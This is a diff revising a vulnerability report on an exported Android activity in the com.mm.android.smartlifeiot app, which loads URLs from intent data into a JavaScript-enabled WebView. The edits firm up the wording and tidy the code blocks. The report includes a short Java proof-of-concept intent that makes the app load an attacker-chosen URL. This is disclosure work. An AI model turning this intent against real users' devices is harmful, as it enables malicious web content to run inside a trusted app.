@@ -1,7 +1,7 @@
 ## Vulnerability Report (Revised)
 
 ### Introduction:
-This vulnerability report outlines a potential security flaw identified in the `com.mm.android.smartlifeiot` app's exported activity: `com.mm.android.easy4ip.MainActivity`. An attacker can leverage this flaw using a third-party app to load arbitrary web content in the WebView of the vulnerable application.
+This vulnerability report outlines a security flaw identified in the `com.mm.android.smartlifeiot` app's exported activity: `com.mm.android.easy4ip.MainActivity`. An attacker can leverage this flaw using a third-party app to load arbitrary web content in the WebView of the vulnerable application.
 
 
 
@@ -11,14 +11,13 @@ App: `com.mm.android.smartlifeiot`
 
 ### Vulnerability Description:
 
-The `com.mm.android.easy4ip.MainActivity` activity in the `com.mm.android.smartlifeiot` app allows for the loading of URLs directly from intent data. This can be potentially exploited by a malicious third-party app to force this activity to load malicious web content from a URL specified by the attacker.
+The `com.mm.android.easy4ip.MainActivity` activity in the `com.mm.android.smartlifeiot` app allows for the loading of URLs directly from intent data. This can be  exploited by a malicious third-party app to force this activity to load malicious web content from a URL specified by the attacker.
 
 ### Proof of Concept:
 
 A third-party malicious app (`com.example.d3m0`) can craft and launch an intent targeting `com.mm.android.easy4ip.MainActivity` as follows:
 
 <code>
-java
 Intent intent = new Intent();
 intent.setComponent(new ComponentName("com.mm.android.smartlifeiot", "com.mm.android.easy4ip.MainActivity"));
 intent.putExtra("url", "imoulife://http://maliciouswebsitetest.com");
@@ -32,22 +31,18 @@ Upon executing this code, `com.mm.android.easy4ip.MainActivity` would be trigger
 1. In the `com.mm.android.easy4ip.MainActivity`, URLs are loaded directly from intent data without adequate validation:
    
 <code>
-   java
    this.url = getIntent().getExtras().getString("url");
 </code>
 
 3. JavaScript execution is enabled in the WebView:
    
 <code>
-   java
    this.webView.getSettings().setJavaScriptEnabled(true);
 </code>
 5. Direct web content loading with the fetched URL:
 
 <code>
-   java
    progressWebView.loadUrl(str);
-   
 </code>
 
 ### Impact:
